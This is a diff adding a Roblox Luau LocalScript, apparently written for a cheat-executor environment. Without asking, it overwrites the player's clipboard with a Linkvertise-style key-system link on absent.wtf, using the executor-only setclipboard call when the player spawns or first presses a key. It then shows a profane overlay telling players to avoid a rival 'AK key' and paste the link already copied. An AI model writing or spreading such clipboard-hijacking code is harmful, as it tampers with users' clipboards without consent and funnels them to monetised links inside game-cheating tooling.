@@ -1,0 +1,158 @@
+-- LocalScript (put in StarterPlayerScripts or StarterGui)
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local LINK_TO_COPY = "https://absent.wtf/Keysystem/Linkvertise_Checkpoint_1"
+
+-- ────────────────────────────────────────
+--  Create GUI
+-- ────────────────────────────────────────
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KeySystemWarning"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+-- Dark semi-transparent background + blur simulation
+local background = Instance.new("Frame")
+background.Name = "DarkOverlay"
+background.Size = UDim2.fromScale(1, 1)
+background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+background.BackgroundTransparency = 1
+background.BorderSizePixel = 0
+background.ZIndex = 998
+background.Parent = screenGui
+
+-- Fake blur frame (Roblox has no real UI blur, so we use dark transparency)
+local blurSimulation = Instance.new("Frame")
+blurSimulation.Name = "BlurLayer"
+blurSimulation.Size = UDim2.fromScale(1, 1)
+blurSimulation.BackgroundTransparency = 1
+blurSimulation.ZIndex = 999
+blurSimulation.Parent = background
+
+-- Main warning text
+local textLabel = Instance.new("TextLabel")
+textLabel.Name = "WarningText"
+textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+textLabel.Position = UDim2.fromScale(0.5, 0.5)
+textLabel.Size = UDim2.fromOffset(700, 220)
+textLabel.BackgroundTransparency = 0.35
+textLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+textLabel.BorderSizePixel = 0
+textLabel.TextColor3 = Color3.fromRGB(255, 90, 90)
+textLabel.TextStrokeTransparency = 0.7
+textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+textLabel.Font = Enum.Font.GothamSemibold
+textLabel.TextSize = 24
+textLabel.TextWrapped = true
+textLabel.TextXAlignment = Enum.TextXAlignment.Center
+textLabel.TextYAlignment = Enum.TextYAlignment.Center
+textLabel.ZIndex = 1000
+textLabel.Visible = false
+textLabel.Parent = screenGui
+
+textLabel.Text = 
+    "Don't copy AK key\n"..
+    "Don't join their fuckass discord server either\n\n"..
+    "Just avoid the drama and paste\n"..
+    "the key link that's already copied in your browser"
+
+-- ────────────────────────────────────────
+--  Animation setup
+-- ────────────────────────────────────────
+
+local fadeInInfo = TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+local holdInfo  = TweenInfo.new(4.5, Enum.EasingStyle.Linear)
+local fadeOutInfo = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
+
+local function showWarning()
+    -- Reset states
+    background.BackgroundTransparency = 1
+    textLabel.TextTransparency = 1
+    textLabel.TextStrokeTransparency = 1
+    textLabel.BackgroundTransparency = 1
+    textLabel.Visible = true
+
+    -- Fade in sequence
+    local bgTween = TweenService:Create(background, fadeInInfo, {BackgroundTransparency = 0.4})
+    local textTween = TweenService:Create(textLabel, fadeInInfo, {
+        TextTransparency = 0,
+        TextStrokeTransparency = 0.7,
+        BackgroundTransparency = 0.35
+    })
+
+    bgTween:Play()
+    textTween:Play()
+
+    textTween.Completed:Connect(function()
+        wait(7.5)   -- hold time
+
+        -- Fade out
+        local bgOut = TweenService:Create(background, fadeOutInfo, {BackgroundTransparency = 1})
+        local textOut = TweenService:Create(textLabel, fadeOutInfo, {
+            TextTransparency = 1,
+            TextStrokeTransparency = 1,
+            BackgroundTransparency = 1
+        })
+
+        bgOut:Play()
+        textOut:Play()
+
+        textOut.Completed:Connect(function()
+            textLabel.Visible = false
+        end)
+    end)
+end
+
+-- ────────────────────────────────────────
+--  Copy link + show message once on spawn
+-- ────────────────────────────────────────
+
+local hasShown = false
+
+local function copyAndWarn()
+    if hasShown then return end
+    hasShown = true
+
+    -- Actually copy to clipboard
+    pcall(function()
+        setclipboard(LINK_TO_COPY)
+    end)
+
+    -- Some key systems check GetFocusedTextBox, so small delay helps
+    task.wait(0.3)
+    showWarning()
+end
+
+-- Fire once player fully loads in
+if player.Character then
+    task.spawn(copyAndWarn)
+else
+    player.CharacterAdded:Connect(function()
+        task.wait(1.2)
+        copyAndWarn()
+    end)
+end
+
+-- Alternative trigger: when player presses any key the first time
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if hasShown then return end
+
+    if input.UserInputType == Enum.UserInputType.Keyboard 
+    or input.UserInputType == Enum.UserInputType.MouseButton1 
+    or input.UserInputType == Enum.UserInputType.Gamepad1 then
+        
+        task.spawn(copyAndWarn)
+    end
+end)
